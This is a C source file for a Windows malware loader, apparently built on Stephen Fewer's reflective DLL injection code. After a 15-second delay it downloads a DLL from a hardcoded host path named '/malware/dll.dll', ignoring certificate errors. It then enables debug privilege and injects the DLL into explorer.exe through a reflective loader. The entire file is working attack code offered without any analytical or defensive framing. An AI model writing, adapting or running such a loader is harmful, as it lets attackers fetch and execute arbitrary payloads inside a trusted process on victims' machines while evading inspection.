//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <WinInet.h>
#include <tlhelp32.h>
#include "LoadLibraryR.h"

#ifndef __MINGW32__
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib, "Wininet.lib")
#endif

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%d", e, GetLastError() ); break; }


DWORD getExplorer() {
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		if (strcmp("explorer.exe", procEntry.szExeFile) == 0) {
			printf("[+] Explorer found: %d\n", procEntry.th32ProcessID);
			return procEntry.th32ProcessID;
		}
	} while (Process32Next(hTH32, &procEntry));
	return 0;
}

DWORD getContentLength(HANDLE hConnect, char* uri) {
	printf("[+] Getting content length\n");
	DWORD contentlength = 0;
	DWORD length = sizeof(contentlength);

	HANDLE hRequestHead = HttpOpenRequestA(hConnect, "HEAD", uri, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_DONT_CACHE, NULL);
	BOOL reqSuccessHead = HttpSendRequestA(hRequestHead, NULL, NULL, NULL, NULL);
	if (!reqSuccessHead) {
		printf("[-] HEAD request failed\n");
		return 0;
	}
	printf("[+] HEAD request successful\n");

	HttpQueryInfoA(hRequestHead, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentlength, &length, 0);
	printf("[+] Content length: %d bytes\n", contentlength);
	HttpEndRequestA(hRequestHead, NULL, NULL, NULL);
	InternetCloseHandle(hRequestHead);
	return contentlength;
}

VOID* getDLL(HANDLE hConnect, char* uri, DWORD contentlength, VOID* dll) {
	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", uri, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_DONT_CACHE, NULL);
	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);

	if (reqSuccess) {
		DWORD receivedData = 0;
		while (InternetReadFile(hRequest, dll, contentlength, &receivedData) && receivedData)
		{
			printf("[+] Successfully read: %d bytes\n", receivedData);
		}
		HttpEndRequestA(hRequest, NULL, NULL, NULL);
		InternetCloseHandle(hRequest);
		return dll;
	}
	HttpEndRequestA(hRequest, NULL, NULL, NULL);
	InternetCloseHandle(hRequest);
	printf("[-] Something went wrong when fetching DLL\n");
	return NULL;
}


// Simple app to inject a reflective DLL into a process via its process ID.
int main( int argc, char * argv[] )
{
	Sleep(15000);
	char* host = "192.168.1.14";
	INTERNET_PORT port = 8080;
	char* uri = "/malware/dll.dll";

	HANDLE hInternet = InternetOpenA(host, INTERNET_OPEN_TYPE_DIRECT, 0, NULL, 0);
	HANDLE hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	DWORD contentlength = getContentLength(hConnect, uri);
	VOID* content;
	if (contentlength > 0) {
		content = malloc(contentlength);
		getDLL(hConnect, uri, contentlength, content);
		printf("[+] %s\n", (char*)content);
	}
	else {
		return 0;
	}
	HANDLE hModule        = NULL;
	HANDLE hProcess       = NULL;
	HANDLE hToken         = NULL;
	LPVOID lpBuffer       = content;
	DWORD dwLength        = contentlength;
	DWORD dwProcessId     = 0;
	TOKEN_PRIVILEGES priv = {0};
	dwProcessId = getExplorer();
	if (!dwProcessId) {
		printf("Failed to get the target process ID\n");
		return 0;
	}

	do
	{
		if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
		{
			priv.PrivilegeCount           = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		
			if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
				AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

			CloseHandle( hToken );
		}

		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );
		if( !hProcess )
			BREAK_WITH_ERROR( "Failed to open the target process" );

		printf("[+] Attempting to load library.\n");
		hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, "ReflectiveLoader", NULL );
		if( !hModule )
			BREAK_WITH_ERROR( "Failed to inject the DLL" );

		printf( "[+] Injected the DLL into process %d.", dwProcessId );
		WaitForSingleObject( hModule, -1 );
	} while( 0 );
	if( hProcess )
		CloseHandle( hProcess );
	if (content)
		free(content);
	return 0;
}
